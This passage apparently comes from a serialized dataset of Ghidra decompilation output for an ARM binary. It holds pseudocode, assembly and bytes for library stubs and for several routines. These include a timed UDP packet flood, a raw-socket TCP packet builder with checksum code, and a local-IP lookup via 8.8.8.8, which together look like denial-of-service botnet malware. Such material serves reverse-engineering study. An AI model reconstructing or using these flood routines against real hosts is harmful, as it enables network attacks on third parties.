ext:00009c00\n.text:00009c04\n.text:00009c08\n.text:00009c0c\n.text:00009c10\n.text:00009c14\n.text:00009c18\n.text:00009c1c\n.text:00009c20\n.text:00009c24\n'
p153
tp154
sS'signal'
p155
(S'\n__stdcall signal(int __sig, __sighandler_t __handler)\n'
p156
V\u000a/* WARNING: Unknown calling convention yet parameter storage is locked */\u000a\u000a__sighandler_t signal(int __sig,__sighandler_t __handler)\u000a\u000a{\u000a  __sighandler_t pVar1;\u000a  \u000a                    /* WARNING: Could not recover jumptable at 0x00008ac0. Too many branches */\u000a                    /* WARNING: Treating indirect jump as call */\u000a  pVar1 = (__sighandler_t)(*(code *)PTR_LAB_00014128)();\u000a  return pVar1;\u000a}\u000a\u000a
p157
S'adr r12,0x8ac0\nadd r12,r12,#0xb000\nldr pc,[r12,#0x668]!\n'
p158
S'00 c6 8f e2\n0b ca 8c e2\n68 f6 bc e5\n'
p159
S'.plt:00008ab8\n.plt:00008abc\n.plt:00008ac0\n'
p160
tp161
sS'write'
p162
(S'\n__stdcall write(int __fd, void * __buf, size_t __n)\n'
p163
V\u000a/* WARNING: Unknown calling convention yet parameter storage is locked */\u000a\u000assize_t write(int __fd,void *__buf,size_t __n)\u000a\u000a{\u000a  ssize_t sVar1;\u000a  \u000a                    /* WARNING: Could not recover jumptable at 0x00008a6c. Too many branches */\u000a                    /* WARNING: Treating indirect jump as call */\u000a  sVar1 = (*(code *)PTR_LAB_0001410c)();\u000a  return sVar1;\u000a}\u000a\u000a
p164
S'adr r12,0x8a6c\nadd r12,r12,#0xb000\nldr pc,[r12,#0x6a0]!\n'
p165
S'00 c6 8f e2\n0b ca 8c e2\na0 f6 bc e5\n'
p166
S'.plt:00008a64\n.plt:00008a68\n.plt:00008a6c\n'
p167
tp168
sS'strcmp'
p169
(S'\n__stdcall strcmp(char * __s1, char * __s2)\n'
p170
V\u000a/* WARNING: Unknown calling convention yet parameter storage is locked */\u000a\u000aint strcmp(char *__s1,char *__s2)\u000a\u000a{\u000a  int iVar1;\u000a  \u000a                    /* WARNING: Could not recover jumptable at 0x00008b44. Too many branches */\u000a                    /* WARNING: Treating indirect jump as call */\u000a  iVar1 = (*(code *)PTR_LAB_00014154)();\u000a  return iVar1;\u000a}\u000a\u000a
p171
S'adr r12,0x8b44\nadd r12,r12,#0xb000\nldr pc,[r12,#0x610]!\n'
p172
S'00 c6 8f e2\n0b ca 8c e2\n10 f6 bc e5\n'
p173
S'.plt:00008b3c\n.plt:00008b40\n.plt:00008b44\n'
p174
tp175
sS'FUN_0000a64c'
p176
(S'\n__stdcall FUN_0000a64c()\n'
p177
V\u000avoid FUN_0000a64c(char *pcParm1,undefined4 uParm2,int iParm3,int iParm4)\u000a\u000a{\u000a  int iVar1;\u000a  undefined *__buf;\u000a  size_t __n;\u000a  time_t tVar2;\u000a  undefined **local_50;\u000a  undefined **local_4c;\u000a  int local_48;\u000a  int local_44;\u000a  undefined4 local_40;\u000a  char *local_3c;\u000a  undefined2 local_34;\u000a  uint16_t local_32;\u000a  in_addr_t local_30;\u000a  undefined **local_24;\u000a  int local_20;\u000a  time_t local_1c;\u000a  undefined4 uStack4;\u000a  \u000a  uStack4 = 0xa658;\u000a  local_4c = &local_50;\u000a  local_48 = iParm4;\u000a  local_44 = iParm3;\u000a  local_40 = uParm2;\u000a  local_3c = pcParm1;\u000a  local_20 = socket(2,2,0x11);\u000a  if (local_20 != 0) {\u000a    local_34 = 2;\u000a    local_32 = htons((uint16_t)local_40);\u000a    local_30 = inet_addr(local_3c);\u000a    iVar1 = -(local_48 + 0xeU & 0xfffffff8);\u000a    local_50 = (undefined **)((int)&local_50 + iVar1);\u000a    local_24 = (undefined **)((int)&local_50 + iVar1);\u000a    FUN_0000b378((undefined **)((int)&local_50 + iVar1),local_48);\u000a    local_1c = time(0,*(undefined *)((int)&local_50 + iVar1));\u000a    connect(local_20,&local_34,0x10,*(undefined *)((int)&local_50 + iVar1));\u000a    do {\u000a      __buf = (undefined *)local_24;\u000a      __n = strlen(local_24,*(undefined *)((int)&local_50 + iVar1));\u000a      send(local_20,__buf,__n,0x4000,*(undefined *)((int)&local_50 + iVar1));\u000a      tVar2 = time(0,*(undefined *)((int)&local_50 + iVar1));\u000a    } while (tVar2 < local_1c + local_44);\u000a    close(local_20,*(undefined *)((int)&local_50 + iVar1));\u000a                    /* WARNING: Subroutine does not return */\u000a    exit(0,*(undefined *)((int)&local_50 + iVar1));\u000a  }\u000a  return;\u000a}\u000a\u000a
p178
S'cpy r12,sp\nstmdb sp!,{ r4 r11 r12 lr pc}\nsub r11,r12,#0x4\nsub sp,sp,#0x3c\nstr r0,[r11,#-0x38]\nstr r1,[r11,#-0x3c]\nstr r2,[r11,#-0x40]\nstr r3,[r11,#-0x44]\ncpy r3,sp\nstr r3,[r11,#-0x48]\nmov r0,#0x2\nmov r1,#0x2\nmov r2,#0x11\nbl 0x00008a28\ncpy r3,r0\nstr r3,[r11,#-0x1c]\nldr r3,[r11,#-0x1c]\ncmp r3,#0x0\nbeq 0x0000a794\nmov r3,#0x2\nstrh r3,[r11,#-0x30]\nldr r3,[r11,#-0x3c]\nmov r3,r3, lsl #0x10\nmov r3,r3, lsr #0x10\ncpy r0,r3\nbl 0x00008b54\ncpy r3,r0\nstrh r3,[r11,#-0x2e]\nldr r3,[r11,#-0x38]\ncpy r0,r3\nbl 0x00008a94\ncpy r3,r0\nstr r3,[r11,#-0x2c]\nldr r3,[r11,#-0x44]\nadd r3,r3,#0x7\nadd r3,r3,#0x7\nmov r3,r3, lsr #0x3\nmov r3,r3, lsl #0x3\nrsb sp,r3,sp\nstr sp,[r11,#-0x4c]\nldr r2,[r11,#-0x4c]\nadd r3,r2,#0x7\nmov r3,r3, lsr #0x3\nmov r3,r3, lsl #0x3\nstr r3,[r11,#-0x4c]\nldr r3,[r11,#-0x4c]\nstr r3,[r11,#-0x20]\nldr r3,[r11,#-0x20]\ncpy r0,r3\nldr r1,[r11,#-0x44]\nbl 0x0000b378\nmov r0,#0x0\nbl 0x00008b30\ncpy r3,r0\nstr r3,[r11,#-0x18]\nsub r3,r11,#0x30\nldr r0,[r11,#-0x1c]\ncpy r1,r3\nmov r2,#0x10\nbl 0x000089d4\nldr r4,[r11,#-0x20]\nldr r3,[r11,#-0x20]\ncpy r0,r3\nbl 0x00008b90\ncpy r3,r0\nldr r0,[r11,#-0x1c]\ncpy r1,r4\ncpy r2,r3\nmov r3,#0x4000\nbl 0x00008a4c\nmov r0,#0x0\nbl 0x00008b30\ncpy r1,r0\nldr r2,[r11,#-0x18]\nldr r3,[r11,#-0x40]\nadd r3,r2,r3\ncmp r1,r3\nblt 0x0000a73c\nldr r0,[r11,#-0x1c]\nbl 0x00008bcc\nmov r0,#0x0\nbl 0x00008b6c\nldr sp,[r11,#-0x48]\nsub sp,r11,#0x10\nldmia sp,{ r4 r11 sp lr }\nbx lr\n'
p179
S'0d c0 a0 e1\n10 d8 2d e9\n04 b0 4c e2\n3c d0 4d e2\n38 00 0b e5\n3c 10 0b e5\n40 20 0b e5\n44 30 0b e5\n0d 30 a0 e1\n48 30 0b e5\n02 00 a0 e3\n02 10 a0 e3\n11 20 a0 e3\ne8 f8 ff eb\n00 30 a0 e1\n1c 30 0b e5\n1c 30 1b e5\n00 00 53 e3\n3e 00 00 0a\n02 30 a0 e3\nb0 33 4b e1\n3c 30 1b e5\n03 38 a0 e1\n23 38 a0 e1\n03 00 a0 e1\n27 f9 ff eb\n00 30 a0 e1\nbe 32 4b e1\n38 30 1b e5\n03 00 a0 e1\nf2 f8 ff eb\n00 30 a0 e1\n2c 30 0b e5\n44 30 1b e5\n07 30 83 e2\n07 30 83 e2\na3 31 a0 e1\n83 31 a0 e1\n0d d0 63 e0\n4c d0 0b e5\n4c 20 1b e5\n07 30 82 e2\na3 31 a0 e1\n83 31 a0 e1\n4c 30 0b e5\n4c 30 1b e5\n20 30 0b e5\n20 30 1b e5\n03 00 a0 e1\n44 10 1b e5\n17 03 00 eb\n00 00 a0 e3\n03 f9 ff eb\n00 30 a0 e1\n18 30 0b e5\n30 30 4b e2\n1c 00 1b e5\n03 10 a0 e1\n10 20 a0 e3\na5 f8 ff eb\n20 40 1b e5\n20 30 1b e5\n03 00 a0 e1\n10 f9 ff eb\n00 30 a0 e1\n1c 00 1b e5\n04 10 a0 e1\n03 20 a0 e1\n01 39 a0 e3\nb9 f8 ff eb\n00 00 a0 e3\nf0 f8 ff eb\n00 10 a0 e1\n18 20 1b e5\n40 30 1b e5\n03 30 82 e0\n03 00 51 e1\ned ff ff ba\n1c 00 1b e5\n0f f9 ff eb\n00 00 a0 e3\nf5 f8 ff eb\n48 d0 1b e5\n10 d0 4b e2\n10 68 9d e8\n1e ff 2f e1\n'
p180
S'.text:0000a64c\n.text:0000a650\n.text:0000a654\n.text:0000a658\n.text:0000a65c\n.text:0000a660\n.text:0000a664\n.text:0000a668\n.text:0000a66c\n.text:0000a670\n.text:0000a674\n.text:0000a678\n.text:0000a67c\n.text:0000a680\n.text:0000a684\n.text:0000a688\n.text:0000a68c\n.text:0000a690\n.text:0000a694\n.text:0000a698\n.text:0000a69c\n.text:0000a6a0\n.text:0000a6a4\n.text:0000a6a8\n.text:0000a6ac\n.text:0000a6b0\n.text:0000a6b4\n.text:0000a6b8\n.text:0000a6bc\n.text:0000a6c0\n.text:0000a6c4\n.text:0000a6c8\n.text:0000a6cc\n.text:0000a6d0\n.text:0000a6d4\n.text:0000a6d8\n.text:0000a6dc\n.text:0000a6e0\n.text:0000a6e4\n.text:0000a6e8\n.text:0000a6ec\n.text:0000a6f0\n.text:0000a6f4\n.text:0000a6f8\n.text:0000a6fc\n.text:0000a700\n.text:0000a704\n.text:0000a708\n.text:0000a70c\n.text:0000a710\n.text:0000a714\n.text:0000a718\n.text:0000a71c\n.text:0000a720\n.text:0000a724\n.text:0000a728\n.text:0000a72c\n.text:0000a730\n.text:0000a734\n.text:0000a738\n.text:0000a73c\n.text:0000a740\n.text:0000a744\n.text:0000a748\n.text:0000a74c\n.text:0000a750\n.text:0000a754\n.text:0000a758\n.text:0000a75c\n.text:0000a760\n.text:0000a764\n.text:0000a768\n.text:0000a76c\n.text:0000a770\n.text:0000a774\n.text:0000a778\n.text:0000a77c\n.text:0000a780\n.text:0000a784\n.text:0000a788\n.text:0000a78c\n.text:0000a790\n.text:0000a794\n.text:0000a798\n.text:0000a79c\n.text:0000a7a0\n'
p181
tp182
sS'read'
p183
(S'\n__stdcall read(int __fd, void * __buf, size_t __nbytes)\n'
p184
V\u000a/* WARNING: Unknown calling convention yet parameter storage is locked */\u000a\u000assize_t read(int __fd,void *__buf,size_t __nbytes)\u000a\u000a{\u000a  ssize_t sVar1;\u000a  \u000a                    /* WARNING: Could not recover jumptable at 0x00008acc. Too many branches */\u000a                    /* WARNING: Treating indirect jump as call */\u000a  sVar1 = (*(code *)PTR_LAB_0001412c)();\u000a  return sVar1;\u000a}\u000a\u000a
p185
S'adr r12,0x8acc\nadd r12,r12,#0xb000\nldr pc,[r12,#0x660]!\n'
p186
S'00 c6 8f e2\n0b ca 8c e2\n60 f6 bc e5\n'
p187
S'.plt:00008ac4\n.plt:00008ac8\n.plt:00008acc\n'
p188
tp189
sS'getsockname'
p190
(S'\n__stdcall getsockname(int __fd, sockaddr * __addr, socklen_t * __len)\n'
p191
V\u000a/* WARNING: Unknown calling convention yet parameter storage is locked */\u000a\u000aint getsockname(int __fd,sockaddr *__addr,socklen_t *__len)\u000a\u000a{\u000a  int iVar1;\u000a  \u000a                    /* WARNING: Could not recover jumptable at 0x00008bf8. Too many branches */\u000a                    /* WARNING: Treating indirect jump as call */\u000a  iVar1 = (*(code *)PTR_LAB_00014190)();\u000a  return iVar1;\u000a}\u000a\u000a
p192
S'adr r12,0x8bf8\nadd r12,r12,#0xb000\nldr pc,[r12,#0x598]!\n'
p193
S'00 c6 8f e2\n0b ca 8c e2\n98 f5 bc e5\n'
p194
S'.plt:00008bf0\n.plt:00008bf4\n.plt:00008bf8\n'
p195
tp196
sS'FUN_0000b65c'
p197
(S'\n__stdcall FUN_0000b65c()\n'
p198
V\u000auint32_t FUN_0000b65c(void)\u000a\u000a{\u000a  int *piVar1;\u000a  uint32_t local_2c;\u000a  socklen_t local_28;\u000a  sa_family_t local_24;\u000a  uint16_t local_22;\u000a  uint32_t local_20;\u000a  int local_14;\u000a  undefined4 uStack4;\u000a  \u000a  uStack4 = 0xb668;\u000a  local_28 = 0x10;\u000a  piVar1 = __errno_location();\u000a  *piVar1 = 0;\u000a  local_14 = socket(2,2,0);\u000a  if (local_14 == -1) {\u000a    local_2c = 0;\u000a  }\u000a  else {\u000a    local_24 = 2;\u000a    local_20 = htonl(0x8080808);\u000a    local_22 = htons(0x35);\u000a    connect(local_14,(sockaddr *)&local_24,0x10);\u000a    getsockname(local_14,(sockaddr *)&local_24,&local_28);\u000a    close(local_14);\u000a    local_2c = local_20;\u000a  }\u000a  return local_2c;\u000a}\u000a\u000a
p199
S'cpy r12,sp\nstmdb sp!,{ r11 r12 lr pc}\nsub r11,r12,#0x4\nsub sp,sp,#0x20\nmov r3,#0x10\nstr r3,[r11,#-0x24]\nbl 0x00008b60\ncpy r2,r0\nmov r3,#0x0\nstr r3,[r2,#0x0]\nmov r0,#0x2\nmov r1,#0x2\nmov r2,#0x0\nbl 0x00008a28\ncpy r3,r0\nstr r3,[r11,#-0x10]\nldr r3,[r11,#-0x10]\ncmn r3,#0x1\nbne 0x0000b6b4\nmov r3,#0x0\nstr r3,[r11,#-0x28]\nb 0x0000b71c\nmov r3,#0x2\nstrh r3,[r11,#-0x20]\nmov r0,#0x800\nadd r0,r0,#0x8\norr r0,r0,r0, lsl #0x10\nbl 0x00008ad0\ncpy r3,r0\nstr r3,[r11,#-0x1c]\nmov r0,#0x35\nbl 0x00008b54\ncpy r3,r0\nstrh r3,[r11,#-0x1e]\nsub r3,r11,#0x20\nldr r0,[r11,#-0x10]\ncpy r1,r3\nmov r2,#0x10\nbl 0x000089d4\nsub r3,r11,#0x20\nsub r2,r11,#0x24\nldr r0,[r11,#-0x10]\ncpy r1,r3\nbl 0x00008bf0\nldr r0,[r11,#-0x10]\nbl 0x00008bcc\nldr r3,[r11,#-0x1c]\nstr r3,[r11,#-0x28]\nldr r3,[r11,#-0x28]\ncpy r0,r3\nsub sp,r11,#0xc\nldmia sp,{ r11 sp lr }\nbx lr\n'
p200
S'0d c0 a0 e1\n00 d8 2d e9\n04 b0 4c e2\n20 d0 4d e2\n10 30 a0 e3\n24 30 0b e5\n39 f5 ff eb\n00 20 a0 e1\n00 30 a0 e3\n00 30 82 e5\n02 00 a0 e3\n02 10 a0 e3\n00 20 a0 e3\ne4 f4 ff eb\n00 30 a0 e1\n10 30 0b e5\n10 30 1b e5\n01 00 73 e3\n02 00 00 1a\n00 30 a0 e3\n28 30 0b e5\n19 00 00 ea\n02 30 a0 e3\nb0 32 4b e1\n02 0b a0 e3\n08 00 80 e2\n00 08 80 e1\n00 f5 ff eb\n00 30 a0 e1\n1c 30 0b e5\n35 00 a0 e3\n1d f5 ff eb\n00 30 a0 e1\nbe 31 4b e1\n20 30 4b e2\n10 00 1b e5\n03 10 a0 e1\n10 20 a0 e3\nb6 f4 ff eb\n20 30 4b e2\n24 20 4b e2\n10 00 1b e5\n03 10 a0 e1\n38 f5 ff eb\n10 00 1b e5\n2d f5 ff eb\n1c 30 1b e5\n28 30 0b e5\n28 30 1b e5\n03 00 a0 e1\n0c d0 4b e2\n00 68 9d e8\n1e ff 2f e1\n'
p201
S'.text:0000b65c\n.text:0000b660\n.text:0000b664\n.text:0000b668\n.text:0000b66c\n.text:0000b670\n.text:0000b674\n.text:0000b678\n.text:0000b67c\n.text:0000b680\n.text:0000b684\n.text:0000b688\n.text:0000b68c\n.text:0000b690\n.text:0000b694\n.text:0000b698\n.text:0000b69c\n.text:0000b6a0\n.text:0000b6a4\n.text:0000b6a8\n.text:0000b6ac\n.text:0000b6b0\n.text:0000b6b4\n.text:0000b6b8\n.text:0000b6bc\n.text:0000b6c0\n.text:0000b6c4\n.text:0000b6c8\n.text:0000b6cc\n.text:0000b6d0\n.text:0000b6d4\n.text:0000b6d8\n.text:0000b6dc\n.text:0000b6e0\n.text:0000b6e4\n.text:0000b6e8\n.text:0000b6ec\n.text:0000b6f0\n.text:0000b6f4\n.text:0000b6f8\n.text:0000b6fc\n.text:0000b700\n.text:0000b704\n.text:0000b708\n.text:0000b70c\n.text:0000b710\n.text:0000b714\n.text:0000b718\n.text:0000b71c\n.text:0000b720\n.text:0000b724\n.text:0000b728\n.text:0000b72c\n'
p202
tp203
sS'_DT_FINI'
p204
(S'\n__stdcall _DT_FINI()\n'
p205
V\u000avoid _DT_FINI(void)\u000a\u000a{\u000a  return;\u000a}\u000a\u000a
p206
S'cpy r12,sp\nstmdb sp!,{ r4 r5 r6 r7 r8 r9 r10 r11 r12 lr pc}\nsub r11,r12,#0x4\nldmdb r11,{ r4 r5 r6 r7 r8 r9 r10 r11 sp pc}\n'
p207
S'0d c0 a0 e1\nf0 df 2d e9\n04 b0 4c e2\nf0 af 1b e9\n'
p208
S'.fini:0000bd64\n.fini:0000bd68\n.fini:0000bd6c\n.fini:0000bd70\n'
p209
tp210
sS'strtok'
p211
(S'\n__stdcall strtok(char * __s, char * __delim)\n'
p212
V\u000a/* WARNING: Unknown calling convention yet parameter storage is locked */\u000a\u000achar * strtok(char *__s,char *__delim)\u000a\u000a{\u000a  char *pcVar1;\u000a  \u000a                    /* WARNING: Could not recover jumptable at 0x00008af0. Too many branches */\u000a                    /* WARNING: Treating indirect jump as call */\u000a  pcVar1 = (char *)(*(code *)PTR_LAB_00014138)();\u000a  return pcVar1;\u000a}\u000a\u000a
p213
S'adr r12,0x8af0\nadd r12,r12,#0xb000\nldr pc,[r12,#0x648]!\n'
p214
S'00 c6 8f e2\n0b ca 8c e2\n48 f6 bc e5\n'
p215
S'.plt:00008ae8\n.plt:00008aec\n.plt:00008af0\n'
p216
tp217
sS'clock'
p218
(S'\n__stdcall clock()\n'
p219
V\u000a/* WARNING: Unknown calling convention yet parameter storage is locked */\u000a\u000aclock_t clock(void)\u000a\u000a{\u000a  clock_t cVar1;\u000a  \u000a                    /* WARNING: Could not recover jumptable at 0x00008bb0. Too many branches */\u000a                    /* WARNING: Treating indirect jump as call */\u000a  cVar1 = (*(code *)PTR_LAB_00014178)();\u000a  return cVar1;\u000a}\u000a\u000a
p220
S'adr r12,0x8bb0\nadd r12,r12,#0xb000\nldr pc,[r12,#0x5c8]!\n'
p221
S'00 c6 8f e2\n0b ca 8c e2\nc8 f5 bc e5\n'
p222
S'.plt:00008ba8\n.plt:00008bac\n.plt:00008bb0\n'
p223
tp224
sS'FUN_00008da4'
p225
(S'\n__stdcall FUN_00008da4()\n'
p226
V\u000auint FUN_00008da4(int iParm1,ushort *puParm2,ushort uParm3,int iParm4)\u000a\u000a{\u000a  uint16_t uVar1;\u000a  uint uVar2;\u000a  uint uVar3;\u000a  int local_38;\u000a  ushort *local_24;\u000a  uint local_18;\u000a  \u000a  uVar2 = *(uint *)(iParm1 + 0xc);\u000a  uVar3 = *(uint *)(iParm1 + 0x10);\u000a  local_18 = 0;\u000a  local_38 = iParm4;\u000a  local_24 = puParm2;\u000a  while (1 < local_38) {\u000a    local_18 = local_18 + (uint)*local_24;\u000a    local_24 = local_24 + 1;\u000a    local_38 = local_38 + -2;\u000a  }\u000a  if (local_38 == 1) {\u000a    local_18 = local_18 + (uint)*(byte *)local_24;\u000a  }\u000a  uVar1 = htons((ushort)*(byte *)(iParm1 + 9));\u000a  local_18 = local_18 + (uVar2 >> 0x10) + (uVar2 & 0xffff) + (uVar3 >> 0x10) + (uVar3 & 0xffff) +\u000a             (uint)uVar1 + (uint)uParm3;\u000a  while (local_18 >> 0x10 != 0) {\u000a    local_18 = (local_18 & 0xffff) + (local_18 >> 0x10);\u000a  }\u000a  return ~(local_18 & 0xffff) & 0xffff;\u000a}\u000a\u000a
p227
S'cpy r12,sp\nstmdb sp!,{ r11 r12 lr pc}\nsub r11,r12,#0x4\nsub sp,sp,#0x28\nstr r0,[r11,#-0x28]\nstr r1,[r11,#-0x2c]\nstr r3,[r11,#-0x34]\nstrh r2,[r11,#-0x2e]\nldr r3,[r11,#-0x2c]\nstr r3,[r11,#-0x20]\nldr r3,[r11,#-0x28]\nldr r3,[r3,#0xc]\nstr r3,[r11,#-0x1c]\nldr r3,[r11,#-0x28]\nldr r3,[r3,#0x10]\nstr r3,[r11,#-0x18]\nmov r3,#0x0\nstr r3,[r11,#-0x14]\nldr r3,[r11,#-0x34]\nstr r3,[r11,#-0x10]\nb 0x00008e28\nldr r3,[r11,#-0x20]\nldrh r3,[r3,#0x0]\ncpy r2,r3\nldr r3,[r11,#-0x14]\nadd r3,r3,r2\nstr r3,[r11,#-0x14]\nldr r3,[r11,#-0x20]\nadd r3,r3,#0x2\nstr r3,[r11,#-0x20]\nldr r3,[r11,#-0x34]\nsub r3,r3,#0x2\nstr r3,[r11,#-0x34]\nldr r3,[r11,#-0x34]\ncmp r3,#0x1\nbgt 0x00008df8\nldr r3,[r11,#-0x34]\ncmp r3,#0x1\nbne 0x00008e58\nldr r3,[r11,#-0x20]\nldrb r3,[r3,#0x0]\ncpy r2,r3\nldr r3,[r11,#-0x14]\nadd r3,r3,r2\nstr r3,[r11,#-0x14]\nldr r3,[r11,#-0x1c]\nmov r3,r3, lsr #0x10\nmov r3,r3, lsl #0x10\nmov r3,r3, lsr #0x10\nldr r2,[r11,#-0x14]\nadd r3,r2,r3\nstr r3,[r11,#-0x14]\nldr r3,[r11,#-0x1c]\nmov r3,r3, lsl #0x10\nmov r3,r3, lsr #0x10\nldr r2,[r11,#-0x14]\nadd r3,r2,r3\nstr r3,[r11,#-0x14]\nldr r3,[r11,#-0x18]\nmov r3,r3, lsr #0x10\nmov r3,r3, lsl #0x10\nmov r3,r3, lsr #0x10\nldr r2,[r11,#-0x14]\nadd r3,r2,r3\nstr r3,[r11,#-0x14]\nldr r3,[r11,#-0x18]\nmov r3,r3, lsl #0x10\nmov r3,r3, lsr #0x10\nldr r2,[r11,#-0x14]\nadd r3,r2,r3\nstr r3,[r11,#-0x14]\nldr r3,[r11,#-0x28]\nldrb r3,[r3,#0x9]\ncpy r0,r3\nbl 0x00008b54\ncpy r3,r0\ncpy r2,r3\nldr r3,[r11,#-0x14]\nadd r3,r3,r2\nstr r3,[r11,#-0x14]\nldrh r2,[r11,#-0x2e]\nldr r3,[r11,#-0x14]\nadd r3,r3,r2\nstr r3,[r11,#-0x14]\nb 0x00008f14\nldr r3,[r11,#-0x14]\nmov r3,r3, lsl #0x10\nmov r3,r3, lsr #0x10\nldr r2,[r11,#-0x14]\nmov r2,r2, lsr #0x10\nadd r3,r3,r2\nstr r3,[r11,#-0x14]\nldr r3,[r11,#-0x14]\nmov r3,r3, lsr #0x10\ncmp r3,#0x0\nbne 0x00008ef8\nldr r3,[r11,#-0x14]\nmov r3,r3, lsl #0x10\nmov r3,r3, lsr #0x10\nmvn r3,r3\nmov r3,r3, lsl #0x10\nmov r3,r3, lsr #0x10\ncpy r0,r3\nsub sp,r11,#0xc\nldmia sp,{ r11 sp lr }\nbx lr\n'
p228
S'0d c0 a0 e1\n00 d8 2d e9\n04 b0 4c e2\n28 d0 4d e2\n28 00 0b e5\n2c 10 0b e5\n34 30 0b e5\nbe 22 4b e1\n2c 30 1b e5\n20 30 0b e5\n28 30 1b e5\n0c 30 93 e5\n1c 30 0b e5\n28 30 1b e5\n10 30 93 e5\n18 30 0b e5\n00 30 a0 e3\n14 30 0b e5\n34 30 1b e5\n10 30 0b e5\n0b 00 00 ea\n20 30 1b e5\nb0 30 d3 e1\n03 20 a0 e1\n14 30 1b e5\n02 30 83 e0\n14 30 0b e5\n20 30 1b e5\n02 30 83 e2\n20 30 0b e5\n34 30 1b e5\n02 30 43 e2\n34 30 0b e5\n34 30 1b e5\n01 00 53 e3\nf0 ff ff ca\n34 30 1b e5\n01 00 53 e3\n05 00 00 1a\n20 30 1b e5\n00 30 d3 e5\n03 20 a0 e1\n14 30 1b e5\n02 30 83 e0\n14 30 0b e5\n1c 30 1b e5\n23 38 a0 e1\n03 38 a0 e1\n23 38 a0 e1\n14 20 1b e5\n03 30 82 e0\n14 30 0b e5\n1c 30 1b e5\n03 38 a0 e1\n23 38 a0 e1\n14 20 1b e5\n03 30 82 e0\n14 30 0b e5\n18 30 1b e5\n23 38 a0 e1\n03 38 a0 e1\n23 38 a0 e1\n14 20 1b e5\n03 30 82 e0\n14 30 0b e5\n18 30 1b e5\n03 38 a0 e1\n23 38 a0 e1\n14 20 1b e5\n03 30 82 e0\n14 30 0b e5\n28 30 1b e5\n09 30 d3 e5\n03 00 a0 e1\n20 ff ff eb\n00 30 a0 e1\n03 20 a0 e1\n14 30 1b e5\n02 30 83 e0\n14 30 0b e5\nbe 22 5b e1\n14 30 1b e5\n02 30 83 e0\n14 30 0b e5\n06 00 00 ea\n14 30 1b e5\n03 38 a0 e1\n23 38 a0 e1\n14 20 1b e5\n22 28 a0 e1\n02 30 83 e0\n14 30 0b e5\n14 30 1b e5\n23 38 a0 e1\n00 00 53 e3\nf4 ff ff 1a\n14 30 1b e5\n03 38 a0 e1\n23 38 a0 e1\n03 30 e0 e1\n03 38 a0 e1\n23 38 a0 e1\n03 00 a0 e1\n0c d0 4b e2\n00 68 9d e8\n1e ff 2f e1\n'
p229
S'.text:00008da4\n.text:00008da8\n.text:00008dac\n.text:00008db0\n.text:00008db4\n.text:00008db8\n.text:00008dbc\n.text:00008dc0\n.text:00008dc4\n.text:00008dc8\n.text:00008dcc\n.text:00008dd0\n.text:00008dd4\n.text:00008dd8\n.text:00008ddc\n.text:00008de0\n.text:00008de4\n.text:00008de8\n.text:00008dec\n.text:00008df0\n.text:00008df4\n.text:00008df8\n.text:00008dfc\n.text:00008e00\n.text:00008e04\n.text:00008e08\n.text:00008e0c\n.text:00008e10\n.text:00008e14\n.text:00008e18\n.text:00008e1c\n.text:00008e20\n.text:00008e24\n.text:00008e28\n.text:00008e2c\n.text:00008e30\n.text:00008e34\n.text:00008e38\n.text:00008e3c\n.text:00008e40\n.text:00008e44\n.text:00008e48\n.text:00008e4c\n.text:00008e50\n.text:00008e54\n.text:00008e58\n.text:00008e5c\n.text:00008e60\n.text:00008e64\n.text:00008e68\n.text:00008e6c\n.text:00008e70\n.text:00008e74\n.text:00008e78\n.text:00008e7c\n.text:00008e80\n.text:00008e84\n.text:00008e88\n.text:00008e8c\n.text:00008e90\n.text:00008e94\n.text:00008e98\n.text:00008e9c\n.text:00008ea0\n.text:00008ea4\n.text:00008ea8\n.text:00008eac\n.text:00008eb0\n.text:00008eb4\n.text:00008eb8\n.text:00008ebc\n.text:00008ec0\n.text:00008ec4\n.text:00008ec8\n.text:00008ecc\n.text:00008ed0\n.text:00008ed4\n.text:00008ed8\n.text:00008edc\n.text:00008ee0\n.text:00008ee4\n.text:00008ee8\n.text:00008eec\n.text:00008ef0\n.text:00008ef4\n.text:00008ef8\n.text:00008efc\n.text:00008f00\n.text:00008f04\n.text:00008f08\n.text:00008f0c\n.text:00008f10\n.text:00008f14\n.text:00008f18\n.text:00008f1c\n.text:00008f20\n.text:00008f24\n.text:00008f28\n.text:00008f2c\n.text:00008f30\n.text:00008f34\n.text:00008f38\n.text:00008f3c\n.text:00008f40\n.text:00008f44\n.text:00008f48\n'
p230
tp231
sS'FUN_0000a7a4'
p232
(S'\n__stdcall FUN_0000a7a4(undefined param_1, undefined param_2, undefined param_3, undefined param_4, undefined4 param_5)\n'
p233
V\u000avoid FUN_0000a7a4(char *param_1,int param_2,int param_3,uint param_4,undefined *param_5)\u000a\u000a{\u000a  undefined2 uVar1;\u000a  uint16_t uVar2;\u000a  int iVar3;\u000a  undefined4 uVar4;\u000a  time_t tVar5;\u000a  socklen_t sStack204;\u000a  byte local_c8 [8];\u000a  byte local_c0;\u000a  byte local_b8;\u000a  undefined2 auStack180 [2];\u000a  byte local_b0;\u000a  byte local_a8;\u000a  byte local_a0;\u000a  byte local_98;\u000a  byte local_90;\u000a  byte local_88;\u000a  byte local_80;\u000a  byte local_78;\u000a  byte local_70;\u000a  byte local_68;\u000a  size_t local_60;\u000a  byte *local_5c;\u000a  uint local_58;\u000a  undefined *local_54;\u000a  uint local_50;\u000a  int local_4c;\u000a  int local_48;\u000a  char *local_44;\u000a  undefined4 local_3c;\u000a  undefined2 local_38;\u000a  uint16_t local_36;\u000a  in_addr_t local_34;\u000a  byte *local_28;\u000a  int local_24;\u000a  byte *local_1c;\u000a  undefined2 *local_18;\u000a  time_t local_14;\u000a  undefined4 uStack4;\u000a  \u000a  uStack4 = 0xa7b0;\u000a  local_54 = &stack0xffffff30;\u000a  local_38 = 2;\u000a  if (param_2 == 0) {\u000a    local_54 = &stack0xffffff30;\u000a    local_50 = param_4;\u000a    local_4c = param_3;\u000a    local_48 = param_2;\u000a    local_44 = param_1;\u000a    local_36 = FUN_0000b2a4();\u000a  }\u000a  else {\u000a    local_50 = param_4;\u000a    local_4c = param_3;\u000a    local_48 = param_2;\u000a    local_44 = param_1;\u000a    local_36 = htons((uint16_t)param_2);\u000a  }\u000a  local_34 = inet_addr(local_44);\u000a  local_24 = socket(2,3,6);\u000a  if (local_24 != 0) {\u000a    local_3c = 1;\u000a    iVar3 = setsockopt(local_24,0,3,&local_3c,4);\u000a    if (-1 < iVar3) {\u000a      local_60 = local_50 + 0x28;\u000a      iVar3 = -(local_50 + 0x36 & 0xfffffff8);\u000a      local_5c = local_c8 + iVar3;\u000a      local_18 = (undefined2 *)((int)auStack180 + iVar3);\u000a      local_68 = *local_5c & 0xf5 